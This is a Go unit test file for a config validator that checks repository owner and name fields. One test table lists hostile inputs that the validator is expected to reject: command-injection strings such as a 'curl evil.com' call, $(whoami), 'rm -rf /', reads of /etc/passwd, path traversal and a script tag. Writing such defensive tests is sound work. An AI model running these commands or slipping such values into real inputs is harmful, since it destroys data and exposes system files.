package config

import "testing"

func TestValidate_ValidInputs(t *testing.T) {
	valid := []struct {
		owner string
		name  string
	}{
		{"rumor-ml", "commons.systems"},
		{"github", "docs"},
		{"my_org", "my.repo-name"},
		{"test123", "repo_test.example"},
		{"org-123", "repo.name_with-all.chars"},
	}
	for _, tc := range valid {
		cfg := Config{RepoOwner: tc.owner, RepoName: tc.name}
		if err := cfg.Validate(); err != nil {
			t.Errorf("Expected valid for %s/%s, got error: %v", tc.owner, tc.name, err)
		}
	}
}

func TestValidate_RejectsInjection(t *testing.T) {
	malicious := []struct {
		owner string
		name  string
	}{
		{`evil"; curl evil.com; echo "`, "repo"},
		{"owner", "$(whoami)"},
		{"owner", "../../../etc/passwd"},
		{"`id`", "repo"},
		{"owner;rm -rf /", "repo"},
		{"owner", "repo`echo pwned`"},
		{"owner$(id)", "repo"},
		{"owner", "repo;cat /etc/passwd"},
		{"owner|id", "repo"},
		{"owner", "repo&whoami&"},
		{"owner\nid", "repo"},
		{"owner", "repo\nls -la"},
		{"owner'", "repo"},
		{"owner", "repo\""},
		{"owner<script>", "repo"},
		{"owner", "repo%00"},
	}
	for _, tc := range malicious {
		cfg := Config{RepoOwner: tc.owner, RepoName: tc.name}
		if err := cfg.Validate(); err == nil {
			t.Errorf("Expected error for malicious input: %s/%s", tc.owner, tc.name)
		}
	}
}

func TestValidate_EmptyStrings(t *testing.T) {
	testCases := []struct {
		owner string
		name  string
	}{
		{"", "repo"},
		{"owner", ""},
		{"", ""},
	}
	for _, tc := range testCases {
		cfg := Config{RepoOwner: tc.owner, RepoName: tc.name}
		if err := cfg.Validate(); err == nil {
			t.Errorf("Expected error for empty strings: %s/%s", tc.owner, tc.name)
		}
	}
}
